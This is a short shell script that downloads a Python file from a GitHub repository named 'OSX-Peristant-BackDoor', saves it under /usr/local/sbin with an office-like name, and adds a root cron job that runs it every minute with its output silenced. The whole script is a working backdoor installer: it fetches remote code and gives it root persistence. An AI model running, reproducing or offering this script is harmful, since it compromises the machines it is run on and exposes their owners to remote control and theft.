#!/bin/sh
#ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
mkdir /usr/local/sbin
curl https://raw.githubusercontent.com/pistacchietto/OSX-Peristant-BackDoor/master/woffice_app.py  -o /usr/local/sbin/woffice_app.py
#chmod 777 /usr/local/sbin/woffice_app.py
#croncmd="/home/me/myfunction myargs > /home/me/myfunction.log 2>&1"
#cronjob="0 */15 * * * $croncmd"
#croncmd="/etc/init.d/rc.local"
croncmd="python /usr/local/sbin/woffice_app.py > /dev/null"
cronjob="* * * * * $croncmd"
(crontab -l -u root | grep -v -F "$croncmd" ; echo "$cronjob" ) | crontab -u root -
